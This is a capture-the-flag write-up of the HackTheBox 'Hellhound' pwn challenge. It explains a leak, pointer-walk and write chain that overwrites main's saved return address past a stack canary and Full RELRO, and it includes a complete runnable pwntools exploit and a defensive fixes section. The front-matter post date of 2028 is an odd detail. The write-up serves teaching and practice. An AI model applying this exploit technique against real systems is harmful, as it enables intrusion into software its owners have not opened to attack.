---
layout: post
title: "Hellhound"
date: 2028-02-02 09:00:00 -0500
categories: [HackTheBox, Challenges, Pwn]
tags: [hackthebox, challenge, pwn, pointer-walk, saved-rip, ret2win, canary-bypass, full-relro, info-leak, glibc]
description: "A Medium Pwn challenge that looks like a heap problem but is really an attacker-followed pointer-walk: compose a leak, a follow-the-pointer action, and a bounded write into an arbitrary write onto the saved return address — stepping around the stack canary and Full RELRO without ever doing a linear overflow."
---

## Overview

Hellhound is a Medium Pwn challenge — a 64-bit binary (glibc 2.23, **No PIE + Full RELRO
+ stack canary + NX**) presenting a menu that malloc's a chunk and even has a hidden
`free`. All of that is a red herring. The only state that matters is a single pointer
variable on `main`'s stack, and the menu hands you three primitives that compose into an
[out-of-bounds write](https://cwe.mitre.org/data/definitions/787.html) aimed directly at
the saved return address — hopping straight over the canary and making Full RELRO
irrelevant, because no linear overflow and no GOT are ever involved.

## The technique

The binary keeps one pointer, `ptr` (at `rbp-0x48`, initialised to `malloc(0x40)`), and the
menu exposes:

| Menu | Code | What it gives you |
|------|------|-------------------|
| 1 Analyze chipset | `printf("...[%ld]", &ptr)` | leaks the **stack address of the `ptr` variable** → ASLR bypass (the binary is No-PIE, so this supplies the missing stack base) |
| 2 Modify hardware | `read(0, ptr, 0x20)` | writes up to 0x20 bytes to wherever `ptr` points |
| 3 Check results | `ptr = *(ptr + 8)` | a **pointer-walk**: follow the qword at `ptr+8` |
| 69 (hidden) | `free(ptr)`; then `main` returns | the `ret` that actually fires the exploit |

There is an uncalled win function, `berserk_mode_off` at `0x400977`, that runs
`system("cat ./flag.txt")`. That is the redirect target.

Individually the three primitives are harmless. Together they are a write-what-where: stage
an address inside the object, *walk* `ptr` onto that address, then *write* through it. Point
it at `main`'s saved return address and overwrite it with the win function.

The saved RIP sits at `rbp+0x8`. Since option 1 leaks `&ptr` (which is `rbp-0x48`), the math
is simply **`saved_RIP = leak + 0x50`**.

The reason this beats the canary is subtle but important: we never do a linear
[stack buffer overflow](https://cwe.mitre.org/data/definitions/121.html) that would have to
cross (and smash) the canary. The pointer-walk *places* `ptr` directly onto the saved-RIP
slot, and we write 8 bytes there. The canary is never touched, so it never needs leaking.

## Solution

The one wrinkle is the hidden option 69: it calls `free(ptr)` **before** `main` returns.
Freeing a non-heap pointer aborts in glibc — so we first walk `ptr` to a planted `NULL`
(making the call a harmless `free(NULL)`), and only then let the function epilogue's `ret`
jump into the win gadget. That is why the overwrite payload writes 16 bytes:
`p64(win) + p64(0)`.

The chain, in order:

1. **Opt 1** → `leak = &ptr`; compute `ret_addr = leak + 0x50`.
2. **Opt 2** → write `p64(0) + p64(ret_addr)` so `chunk[8] = ret_addr`.
3. **Opt 3** → walk: `ptr = *(chunk+8) = ret_addr` (now pointing at the saved RIP).
4. **Opt 2** → write `p64(berserk) + p64(0)`: overwrites the saved RIP and plants a NULL right after it.
5. **Opt 3** → walk again: `ptr = *(ret_addr+8) = NULL`.
6. **Opt 69** → `free(NULL)` is a no-op; `main` returns → `ret` → `berserk_mode_off` → `system("cat ./flag.txt")`.

The full, runnable exploit (`python3 solve.py <host> <port>`):

```python
from pwn import *

context.arch = 'amd64'
BERSERK = 0x400977

io = remote(sys.argv[1], int(sys.argv[2]))

def menu(choice):
    io.sendafter(b'>>', str(choice).encode() + b'\n')

# 1) leak &ptr (printed as signed %ld)
menu(1)
io.recvuntil(b'serial number: [')
leak = int(io.recvuntil(b']', drop=True))
ret_addr = leak + 0x50          # rbp-0x48 + 0x50 = rbp+0x8 = saved RIP of main

# 2) stage ret_addr into chunk[8]
menu(2)
io.send(p64(0) + p64(ret_addr))

# 3) walk onto the saved RIP
menu(3)

# 4) overwrite saved RIP with berserk_mode_off; plant NULL at ret_addr+8
menu(2)
io.send(p64(BERSERK) + p64(0))

# 5) walk again -> ptr = NULL, so the next free is safe
menu(3)

# 6) free(NULL) then main ret's -> berserk_mode_off -> system("cat ./flag.txt")
menu(69)

io.recvuntil(b'HTB{')
print(b'HTB{' + io.recvuntil(b'}'))
```

Running it against the live instance prints the flag: `HTB{...}` (redacted).

## Why it worked

At heart this is an untrusted-pointer dereference
([CWE-822](https://cwe.mitre.org/data/definitions/822.html)) whose effect is an
[out-of-bounds write](https://cwe.mitre.org/data/definitions/787.html): the program hands
the user a raw pointer's *address* (the leak), lets the user *re-point* that pointer at
arbitrary memory (the walk), and then *writes* through it with no bounds. Every enabled
mitigation — the stack canary, Full RELRO, NX — is bypassed simply because the write is
aimed at the return address directly, rather than through a buffer that sits below the
canary or through the GOT.

## Fix / defense

- **Never expose a raw heap/stack pointer's address to the user.** The `printf("%ld", &ptr)`
  leak is what hands the attacker the ASLR bypass.
- **Bound every write to the object's own size**, and validate that any "walk"/dereference
  target stays inside the intended allocation — don't let a user action arbitrarily
  re-point a live pointer.
- **Keep object handles opaque** — indices into a checked table, not raw addresses. Full
  RELRO and a stack canary bought nothing here precisely because the attack routed *around*
  both; the real fix is at the pointer-handling logic, not the compiler flags.
